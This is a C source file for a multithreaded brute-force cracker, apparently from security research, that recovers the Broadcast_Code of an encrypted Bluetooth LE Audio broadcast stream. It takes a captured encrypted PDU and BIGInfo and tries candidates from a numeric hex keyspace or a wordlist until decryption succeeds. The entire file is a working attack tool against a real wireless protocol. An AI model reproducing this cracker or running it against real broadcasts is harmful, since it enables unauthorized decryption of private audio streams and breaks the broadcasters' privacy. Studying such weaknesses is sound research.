/* main.c
 * Copyright (c) 2024 Frieder Steinmetz - ERNW Enno Rey Netzwerke GmbH
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <pthread.h>
#include <stdatomic.h>
#include <popt.h>

#include <bt_bis.h>
#include <util.h>
#include <types.h>

#include <aes_ni.h>
#include <ccm_mode.h>

atomic_int solution_found = 0;

// struct to pass data to threads
typedef struct {
    uint8_t thread_id;
    uint64_t start;
    uint64_t end;
    char * wordlist_path;

    uint8_t bc_length;
    uint8_t * gskd;
    uint64_t payload_cnt;
    long pdu_len;
    uint8_t * pdu;
    uint8_t * nonce;
} ThreadData;

/**
 * @brief Thread function that loops over a range of hex Broadcast_Codes
 * @param arg ThreadData
 */
void *bruteforce_range_job(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    printf("Thread %u: Working on range [%llu, %llu]\n", data->thread_id, data->start, data->end);

    uint64_t range = data->end - data->start;

    uint8_t * decrypted_payload  = malloc(data->pdu_len);

    // loop over range of potential broadcast codes
    uint8_t broadcast_code[16] = {0};
    for(uint64_t i = data->start; i <= data->end; i++) {
        if (i%1000000 == 0) {
            if (solution_found) {
                // exit early if another thread has found the solution
                pthread_exit(NULL);
            }
            printf("Thread %u: Progress %.6f%%\n", data->thread_id, (double) (i-data->start)/(range/100));
        }
        uint8_t bc_format[5] = {0};
        snprintf(bc_format, 5, "%%%02ux\n", data->bc_length*2);
        snprintf(broadcast_code, 16, bc_format, i);

        // derive gsk from broadcast_code
        uint8_t gsk[16] = {0};
        int ret = bt_bis_gsk(broadcast_code, data->gskd, gsk);
        if(ret != 0) {
            printf("bt_bis_gsk failed.\n");
            
            // todo: clean exit would be nice
            exit(EXIT_FAILURE);
        }

        // decrypt pdu with gsk and nonce
        ret = bt_bis_pdu_decrypt(data->pdu, data->pdu_len, gsk, data->nonce, 0, decrypted_payload);
        // have we decrypted succesfully?
        if(ret == 0) {
            printf("\n\nSuccess!\n\n");
            hexprint((uint8_t*) &data->payload_cnt, 5, "payload_cnt");
            hexprint(broadcast_code, 16, "broadcast_code");
            hexprint(data->pdu, data->pdu_len, "enc_pdu");
            hexprint(decrypted_payload, data->pdu[1] - 4, "decrypted");

            printf("\n\n");
            print_swapped(broadcast_code, 16, "broadcast_code_ascii");

            solution_found = 1;
            free(decrypted_payload);
            pthread_exit(NULL);
        }

        // clear the bc buffer
        // todo: this is probably obsolete in the numeric case
        memset(broadcast_code, 0, 16);
    }

    free(decrypted_payload);
    pthread_exit(NULL);
}

/**
 * @brief Thread function that loops over a chunk of a wordlist for Broadcast_Codes
 * @param arg ThreadData
 */
void *bruteforce_slice_job(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    printf("Thread %u: Working on wordlist chunk from offset %llu to %llu\n", 
           data->thread_id, data->start, data->end);

    // open wordlist file for this thread
    FILE *wordlist = fopen(data->wordlist_path, "r");
    if (!wordlist) {
        perror("Error opening wordlist file in thread");
        pthread_exit(NULL);
    }

    fseek(wordlist, data->start, SEEK_SET);

    uint8_t *decrypted_payload = malloc(data->pdu_len);
    if (!decrypted_payload) {
        perror("Failed to allocate memory for decrypted payload");
        pthread_exit(NULL);
    }

    // BC can't be longer than 16 bytes
    // but we need space for the terminating 0 fgets gives us
    uint8_t broadcast_code[17] = {0};
    uint64_t processed_lines = 0;

    while (ftell(wordlist) < data->end && fgets(broadcast_code, sizeof(broadcast_code), wordlist)) {
        if (solution_found) {
            // exit early if another thread has found the solution
            free(decrypted_payload);
            pthread_exit(NULL);
        }

        // remove trailing newline, if any
        // TODO: this fails if our wordlist has NULL bytes in the words
        // which is technically valid
        size_t len = strlen(broadcast_code);
        if (broadcast_code[len - 1] == '\n') {
            broadcast_code[len - 1] = '\0';
        }

        // derive GSK from broadcast_code
        uint8_t gsk[16] = {0};
        int ret = bt_bis_gsk((uint8_t *)broadcast_code, data->gskd, gsk);
        if (ret != 0) {
            printf("bt_bis_gsk failed for broadcast_code: %s\n", broadcast_code);
            continue;
        }

        // decrypt PDU with GSK and nonce
        ret = bt_bis_pdu_decrypt(data->pdu, data->pdu_len, gsk, data->nonce, 0, decrypted_payload);
        if(ret == 0) {
            sleep(1);
            printf("\n\nSuccess!\n\n");
            hexprint((uint8_t*) &data->payload_cnt, 5, "payload_cnt");
            hexprint(broadcast_code, 16, "broadcast_code");
            hexprint(data->pdu, data->pdu_len, "enc_pdu");
            hexprint(decrypted_payload, data->pdu[1] - 4, "decrypted");

            printf("\n####\n# ");
            print(broadcast_code, 16, "broadcast_code_ascii");
            printf("####\n\n");

            solution_found = 1;
            free(decrypted_payload);
            pthread_exit(NULL);
        }

        processed_lines++;
        if (processed_lines % 100000 == 0) {
            printf("Thread %u: Processed %llu lines\n", data->thread_id, processed_lines);
        }

        // clear the bc buffer
        memset(broadcast_code, 0, 16);
    }

    free(decrypted_payload);
    pthread_exit(NULL);
}


int main(int argc, char *argv[])
{
    char *mode = NULL;
    char *pdu_file = NULL;
    char *biginfo_file = NULL;
    char *wordlist_file = NULL;
    uint64_t payload_cnt = 0;
    int bc_byte_length = 0;
    int num_threads = 0;

    struct poptOption optionsTable[] = {
        { "mode", 'm', POPT_ARG_STRING, &mode, 0, "Mode: numeric or wordlist", "MODE" },
        { "pdu", 'p', POPT_ARG_STRING, &pdu_file, 0, "Encrypted PDU file", "FILE" },
        { "biginfo", 'b', POPT_ARG_STRING, &biginfo_file, 0, "BIGInfo file", "FILE" },
        { "payload-count", 'c', POPT_ARG_LONGLONG, &payload_cnt, 0, "Payload counter", "COUNTER" },
        { "wordlist", 'w', POPT_ARG_STRING, &wordlist_file, 0, "Wordlist file (required for wordlist mode)", "FILE" },
        { "bc-length", 'l', POPT_ARG_INT, &bc_byte_length, 0, "Broadcast Code hex byte length (required for numeric mode)", "LENGTH" },
        { "threads", 't', POPT_ARG_INT, &num_threads, 0, "Number of threads to use", "NUM" },
        POPT_AUTOHELP
        POPT_TABLEEND
    };

    poptContext optCon;
    optCon = poptGetContext(NULL, argc, (const char **)argv, optionsTable, 0);
    poptSetOtherOptionHelp(optCon, "[OPTIONS]...");

    int rc;
    while ((rc = poptGetNextOpt(optCon)) >= 0);

    if (rc < -1) {
        fprintf(stderr, "%s: %s\n", poptBadOption(optCon, POPT_BADOPTION_NOALIAS), poptStrerror(rc));
        poptFreeContext(optCon);
        return EXIT_FAILURE;
    }

    // validate required arguments
    if (!mode || !pdu_file || !biginfo_file || payload_cnt <= 0 || num_threads <= 0 ||
        (strcmp(mode, "wordlist") == 0 && !wordlist_file) ||
        (strcmp(mode, "numeric") == 0 && (bc_byte_length <= 0))) {
        fprintf(stderr, "Missing or invalid arguments.\n");
        poptPrintUsage(optCon, stderr, 0);
        poptFreeContext(optCon);
        return EXIT_FAILURE;
    }

    int use_wordlist = strcmp(mode, "wordlist") == 0;
    FILE *wordlist = NULL;
    long wordlist_size = 0;

    if (use_wordlist) {
        wordlist = fopen(wordlist_file, "r");
        if (!wordlist) {
            perror("Error opening wordlist file.");
            return EXIT_FAILURE;
        }

        fseek(wordlist, 0, SEEK_END);
        wordlist_size = ftell(wordlist);
        fseek(wordlist, 0, SEEK_SET);
    }

    // Determine its size and load the encrypted PDU
    FILE *fpdu;
    fpdu = fopen(pdu_file, "rb");
    if (fpdu == NULL) {
        perror("error opening PDU file.");
        return EXIT_FAILURE;
    }
    fseek(fpdu, 0, SEEK_END);
    long pdu_len = ftell(fpdu);
    fseek(fpdu, 0, SEEK_SET);

    uint8_t *pdu = malloc(pdu_len);
    fread(pdu, pdu_len, 1, fpdu);
    fclose(fpdu);
    printf("Read %d byte PDU file.\n", pdu_len);

    // Load the BIGInfo file into a biginfo struct
    FILE *fbiginfo;
    fbiginfo = fopen(biginfo_file, "rb");
    if (fbiginfo == NULL) {
        perror("error opening BIGInfo file.");

        free(pdu);
        return EXIT_FAILURE;
    }

    long biginfo_len = sizeof(pdu_big_info);
    pdu_big_info *biginfo = malloc(biginfo_len);
    fread(biginfo, biginfo_len, 1, fbiginfo);
    fclose(fbiginfo);
    printf("Read BIGInfo file.\n");

    // The payload counter of the enrcrypted PDU
    printf("Payload Counter: %d\n", payload_cnt);


    /* 
    * At this point we have everything we need.
    * We can start cracking now.
    */

    // calculate the IV
    uint8_t iv[8];
    bt_bis_iv(biginfo->giv, biginfo->seed_access_addr, 1, iv);
    
    // construct the nonce
    uint8_t nonce[13] = {0};
    bt_bis_nonce((uint8_t*) &payload_cnt, iv, 1, nonce);

    uint64_t loop_start = 0;
    // bc_byte_length determines the bruteforce range for hex codes
    // for example bc_byte_length of 2 means we have two byte long codes
    // so the range is 0x0000-0xffff
    // we can calculate the 0xffff by doing (1 << 2*8)-1
    uint64_t loop_end = use_wordlist ? wordlist_size : (((uint64_t) 1 << bc_byte_length*8)-1);

    // thread settings
    uint64_t range = loop_end - loop_start + 1;
    uint64_t chunk_size = range / (uint64_t) num_threads;
    uint64_t remainder = range % num_threads;
    uint8_t total_threads = (remainder > 0) ? num_threads + 1 : num_threads;

    pthread_t *threads = malloc(total_threads * sizeof(pthread_t));
    ThreadData *thread_data = malloc(total_threads * sizeof(ThreadData));
    if (!threads || !thread_data) {
        perror("Failed to allocate memory");
        if (use_wordlist) fclose(wordlist);
        return EXIT_FAILURE;
    }

    // start threads
    uint64_t current_start = loop_start;
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].start = current_start;
        thread_data[i].end = current_start + chunk_size - 1;
        current_start = thread_data[i].end + 1;

        thread_data[i].bc_length = bc_byte_length;
        thread_data[i].gskd = biginfo->gskd;
        thread_data[i].payload_cnt = payload_cnt;
        thread_data[i].pdu_len = pdu_len;
        thread_data[i].pdu = pdu;
        thread_data[i].nonce = nonce;

        if (use_wordlist) {
            thread_data[i].wordlist_path = wordlist_file;
            if (pthread_create(&threads[i], NULL, bruteforce_slice_job, &thread_data[i]) != 0) {
                perror("Failed to create thread");
                free(threads);
                free(thread_data);
                fclose(wordlist);
                return EXIT_FAILURE;
            }
        } else {
            if (pthread_create(&threads[i], NULL, bruteforce_range_job, &thread_data[i]) != 0) {
                perror("Failed to create thread");
                free(threads);
                free(thread_data);
                return EXIT_FAILURE;
            }
        }
    }

    // if the number of BC candidates does not devide evenly by the number of threads...
    if (remainder > 0) {
        thread_data[num_threads].thread_id = num_threads;
        thread_data[num_threads].start = current_start;
        thread_data[num_threads].end = loop_end;

        thread_data[num_threads].bc_length = bc_byte_length;
        thread_data[num_threads].gskd = biginfo->gskd;
        thread_data[num_threads].payload_cnt = payload_cnt;
        thread_data[num_threads].pdu_len = pdu_len;
        thread_data[num_threads].pdu = pdu;
        thread_data[num_threads].nonce = nonce;

        if (use_wordlist) {
            thread_data[num_threads].wordlist_path = wordlist_file;
            if (pthread_create(&threads[num_threads], NULL, bruteforce_slice_job, &thread_data[num_threads]) != 0) {
                perror("Failed to create additional thread");
                free(threads);
                free(thread_data);
                fclose(wordlist);
                return EXIT_FAILURE;
            }
        } else {
            if (pthread_create(&threads[num_threads], NULL, bruteforce_range_job, &thread_data[num_threads]) != 0) {
                perror("Failed to create additional thread");
                free(threads);
                free(thread_data);
                return EXIT_FAILURE;
            }
        }
    }

    // wait for threads and clean up
    for (int i = 0; i < total_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    if (use_wordlist) fclose(wordlist);
    free(threads);
    free(thread_data);
    free(pdu);
    free(biginfo);

    return solution_found ? EXIT_SUCCESS : EXIT_FAILURE;
}
